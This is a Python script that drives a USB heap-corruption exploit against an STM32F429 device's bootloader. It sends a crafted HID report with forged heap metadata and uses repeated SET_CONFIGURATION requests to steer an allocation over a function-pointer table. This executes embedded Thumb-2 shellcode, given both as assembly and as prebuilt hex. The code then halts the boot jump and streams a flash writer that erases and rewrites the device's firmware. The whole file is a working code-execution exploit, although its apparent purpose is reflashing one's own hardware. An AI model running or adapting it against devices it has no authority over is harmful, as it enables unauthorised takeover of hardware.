#!/usr/bin/env python3
import argparse, os, sys, time, zlib
import usb.core

VID, PID    = 0x0483, 0xA0CB
FOPS        = 0x2000CA44
FOPS_INIT   = 0x200015D5     # Verified from boot_sram1_20000000.bin @ 0x2000CA48
FOPS_DEINIT = 0x200015BB     # Verified from boot_sram1_20000000.bin @ 0x2000CA4C
LOADER      = 0x20014C48
LOADER_DEST = 0x20014CE0
FLASHER     = 0x20018000     # SRAM2 (executable on STM32F429; CCMRAM 0x1000xxxx is D-bus only)
BLOCK       = 4096

M_NOP     = 0xC0DE0000
M_INSTALL = 0xC0DE0001
C_INIT    = 0xC0DE0010
C_PROG    = 0xC0DE0011
C_ERASE   = 0xC0DE0012
C_VADDR   = 0xC0DE0013
C_VGO     = 0xC0DE0014
C_RESET   = 0xC0DE0015
C_VLEN    = 0xC0DE0018

LOADER_ASM = """
movw r0, #0x1FA0;  movt r0, #0x2000
movw r1, #0xE7FE;  movt r1, #0xE7FE
str  r1, [r0];     str  r1, [r0, #0x24]
movw r0, #0x15B4;  movt r0, #0x2000
str  r1, [r0]
movw r0, #0xB0B0;  movt r0, #0x1000
movs r1, #0;       str  r1, [r0]
movw r0, #0xCA48;  movt r0, #0x2000;  ldr r1, [r0]
lsrs r3, r1, #16;  movw r2, #0xC0DE;  cmp r3, r2;  bne copy
uxth r1, r1;  cmp r1, #1;  beq exec;  cmp r1, #0x10;  blt done
movw r1, #0x4CE4;  movt r1, #0x2001;  ldr r1, [r1];  cbz r1, done
push {r3, lr};  blx r1;  pop {r3, pc}
exec: ldr r1, [r0, #4];  movw r2, #0x4CE4;  movt r2, #0x2001;  str r1, [r2]
push {r3, lr};  blx r1;  pop {r3, pc}
copy: movw r1, #0x4CE0;  movt r1, #0x2001;  ldr r1, [r1]
ldr r2, [r0], #4;  str r2, [r1], #4
ldr r2, [r0], #4;  str r2, [r1], #4
movw r2, #0x4CE0;  movt r2, #0x2001;  str r1, [r2]
done: bx lr
"""

# Pre-assembled Thumb-2 machine code for LOADER_ASM (used if keystone-engine is not installed)
LOADER_PREBUILT = bytes.fromhex(
    "41f6a070c2f200004ef2fe71cef2fe7101604162"
    "41f2b450c2f2000001604bf2b000c1f200000021"
    "01604cf64820c2f2000001680b0c4cf2de029342"
    "16d189b201290ad0102923db44f6e441c2f20101"
    "0968e9b108b5884708bd416844f6e442c2f20102"
    "116008b5884708bd44f6e041c2f20101096850f8"
    "042b41f8042b50f8042b41f8042b44f6e042c2f2"
    "010211607047"
)

def le32(v): return int(v & 0xFFFFFFFF).to_bytes(4, 'little')

def assemble_loader():
    try:
        from keystone import Ks, KS_ARCH_ARM, KS_MODE_THUMB
        ks = Ks(KS_ARCH_ARM, KS_MODE_THUMB)
        code, _ = ks.asm(LOADER_ASM)
        b = bytes(code)
    except ImportError:
        b = LOADER_PREBUILT
    assert len(b) <= LOADER_DEST - LOADER, "loader too big"
    return b

def stage1(loader):                        # 255 B recovery packet
    p = bytearray(255)
    p[84:88]   = le32(0xFFFFFFA8)          # block size field  @0x20014C3C
    p[88:92]   = le32(FOPS)                # list pointer      @0x20014C40
    p[96:96+len(loader)] = loader          # resident code     @0x20014C48
    p[248:252] = le32(FLASHER)             # write-pointer seed @0x20014CE0
    return bytes(p)

def stage3():                              # 12 B -> M_NOP prevents stage3 from triggering copy:
    return le32(M_NOP) + le32(FOPS_DEINIT) + le32(LOADER | 1)

def cmd_chunk(w0, arg):                    # 12 B command block
    return le32(w0) + le32(arg) + le32(LOADER | 1)

def data_chunk(d8):                        # 12 B data (8 payload + re-arm)
    w = int.from_bytes(d8[0:4], 'little')
    if (w >> 16) == 0xC0DE:
        sys.exit("data word collides with the command signature — aborting")
    return d8 + le32(LOADER | 1)

def set_report(dev, data, timeout=30000):
    dev.ctrl_transfer(0x21, 0x09, 0x0200, 0, data, timeout)

def set_config(dev, v, timeout=5000):
    # Use bmRequestType=0x40 (Vendor-to-Device) with bRequest=0x09:
    # Windows WinUSB/libusb blocks Standard (0x00) SET_CONFIGURATION requests,
    # while STM32 USBD_LL_SetupStage (0x20008B70) only checks (bmRequestType & 0x1F) == 0
    # and USBD_StdDevReq (0x20008E9A) dispatches bRequest == 9 directly to USBD_SetConfig.
    dev.ctrl_transfer(0x40, 0x09, v, 0, b'', timeout)

def find_dev(chase=False):
    backend = None
    try:
        import libusb_package
        backend = libusb_package.get_libusb1_backend()
    except ImportError:
        pass
    while True:
        dev = usb.core.find(idVendor=VID, idProduct=PID, backend=backend)
        if dev is not None:
            try:
                dev._ctx.managed_open()
                try: dev.detach_kernel_driver(0)
                except Exception: pass
                usb.util.claim_interface(dev, 0)
                return dev
            except (NotImplementedError, usb.core.USBError):
                try: usb.util.dispose_resources(dev)
                except Exception: pass
        if not chase: sys.exit("0483:A0CB not present (or WinUSB not ready) — run with --chase")
        time.sleep(0.002)

def run_chain(dev, code):
    print("[1] SET_REPORT(255): recovery packet + resident code @0x%08X" % LOADER)
    set_report(dev, stage1(code))
    print("[2] SET_CONFIG(0):  free() merges blocks")
    set_config(dev, 0)
    print("[3] SET_CONFIG(1):  malloc re-allocates report buffer onto 0x2000CA48")
    set_config(dev, 1)
    print("[4] SET_REPORT(12): dispatcher runs (and freezes boot jump @0x20001FA0)")
    try:
        set_report(dev, stage3(), timeout=5000)
    except usb.core.USBError:
        print("    (transfer timeout — expected if the test code loops forever)")

def probe(seconds=20):
    backend = None
    try:
        import libusb_package
        backend = libusb_package.get_libusb1_backend()
    except ImportError:
        pass
    print("[*] probing for 0483:A0CB for %ds — plug in now" % seconds)
    t0, present, n = time.time(), None, 0
    while time.time() - t0 < seconds:
        here = usb.core.find(idVendor=VID, idProduct=PID, backend=backend) is not None
        if here != present:
            present = here
            print("  T+%6.3fs  %s" % (time.time() - t0, "ENUMERATED" if here else "GONE"))
            n += int(here)
        time.sleep(0.005)
    if n == 0: print("    -> never enumerated: check cable/VBUS or WinUSB driver (Zadig)")
    elif present: print("    -> stable: EASY MODE (no --chase needed)")
    else: print("    -> cyclic ~0.7 s: HARD MODE -> use --chase")

def load_flasher_bin():
    for candidate in [
        'flasher.bin',
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'flasher.bin'),
    ]:
        if os.path.exists(candidate):
            return open(candidate, 'rb').read()
    sys.exit("flasher.bin not found")

def sector_of(a):
    if a < 0x08010000: return (a >> 14) & 3
    if a < 0x08020000: return 4
    return 5 + ((a - 0x08020000) >> 17)

def do_flash(img, base, chase, overwrite_bootloader=False):
    loader = assemble_loader()
    boot_prefix = None
    if base == 0x08000000 and len(img) > 0x20000 and not overwrite_bootloader:
        print("[*] Protecting Sectors 0-4 (0x08000000..0x0801FFFF: Bootloader + LKT stub)")
        print("    -> only flashing Sectors 5-7 (0x08020000..0x0807FFFF, 384 KB)")
        boot_prefix = img[:0x20000]
        img = img[0x20000:]
        base = 0x08020000
    for off in range(0, len(img) - 3, 4):
        w = int.from_bytes(img[off:off+4], 'little')
        if (w >> 16) == 0xC0DE:
            sys.exit("image word @0x%08X collides with the loader signature" % (base + off))
    img += b'\xff' * ((-len(img)) % 8)
    fl = load_flasher_bin()
    assert len(fl) < 0x2800
    for off in range(0, len(fl) - 3, 4):
        w = int.from_bytes(fl[off:off+4], 'little')
        if (w >> 16) == 0xC0DE:
            sys.exit("flasher.bin word @%d collides with the loader signature" % off)
    fl += b'\x00' * ((-len(fl)) % 8)

    dev = find_dev(chase)
    run_chain(dev, loader)
    print("[5] streaming flash-writer (%d B -> 0x%08X)" % (len(fl), FLASHER))
    for i in range(0, len(fl), 8):
        set_report(dev, data_chunk(fl[i:i+8]), timeout=5000)
    print("[6] install flash-writer entry")
    set_report(dev, cmd_chunk(M_INSTALL, FLASHER | 1), timeout=5000)
    print("[7] INIT (stop SysTick, park thread, unlock flash)")
    set_report(dev, cmd_chunk(C_INIT, 0), timeout=30000)
    nblk = (len(img) + BLOCK - 1) // BLOCK
    print("[8] writing %d bytes @0x%08X (%d blocks, DESCENDING)"
          % (len(img), base, nblk))
    erased_sectors = set()
    for b in reversed(range(nblk)):
        addr = base + b * BLOCK
        s = sector_of(addr)
        if s not in erased_sectors:
            print("    [*] erasing Flash Sector %d (for 0x%08X)..." % (s, addr))
            set_report(dev, cmd_chunk(C_ERASE, s), timeout=30000)
            time.sleep(0.010)
            erased_sectors.add(s)
        blk = img[b*BLOCK:(b+1)*BLOCK]
        blk += b'\xff' * ((-len(blk)) % 8)
        if all(x == 0xFF for x in blk):
            print("    block %d/%d @0x%08X (all 0xFF — skipped)" % (nblk - b, nblk, addr))
            continue
        for i in range(0, len(blk), 8):
            set_report(dev, data_chunk(blk[i:i+8]), timeout=5000)
        set_report(dev, cmd_chunk(C_PROG, addr), timeout=30000)
        print("    block %d/%d @0x%08X" % (nblk - b, nblk, addr))
    print("[9] VERIFY (CRC32) — a mismatch hangs the device (timeout = failure)")
    crc = zlib.crc32(img) & 0xFFFFFFFF
    set_report(dev, cmd_chunk(C_VADDR, base),     timeout=5000)
    set_report(dev, cmd_chunk(C_VLEN, len(img)),  timeout=5000)
    set_report(dev, cmd_chunk(C_VGO,  crc),       timeout=60000)
    print("[+] verify OK (CRC32 %08X)" % crc)
    print("[10] RESET")
    try: set_report(dev, cmd_chunk(C_RESET, 0), timeout=2000)
    except Exception: pass
    print("[+] done — device should now boot the new firmware")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('mode', choices=['probe', 'test', 'flash'])
    ap.add_argument('--image')
    ap.add_argument('--chase', action='store_true')
    ap.add_argument('--base', type=lambda x: int(x, 0), default=0x08000000)
    ap.add_argument('--overwrite-bootloader', action='store_true',
                    help='Also overwrite Sectors 0-4 (0x08000000..0x0801FFFF); skipped by default for safety')
    ap.add_argument('--sc', choices=['hang', 'return', 'hold'], default='hang')
    a = ap.parse_args()
    if a.mode == 'probe':
        probe()
        return
    if a.mode == 'test':
        dev = find_dev(chase=a.chase)
        if a.sc == 'hold':
            run_chain(dev, assemble_loader())
            print("[*] waiting 1.5s to verify boot jump is frozen (past ~0.7s window)...")
            time.sleep(1.5)
            set_report(dev, stage3(), timeout=5000)
            print("[+] HOLD CONFIRMED: device is still alive on USB after 1.5s!")
        else:
            run_chain(dev, bytes.fromhex('fee7' if a.sc == 'hang' else '7047'))
        print("[+] sequence done — replug to continue")
        return
    if not a.image:
        sys.exit("--image is required for 'flash' mode")
    do_flash(open(a.image, 'rb').read(), a.base, a.chase, a.overwrite_bootloader)

if __name__ == '__main__':
    main()
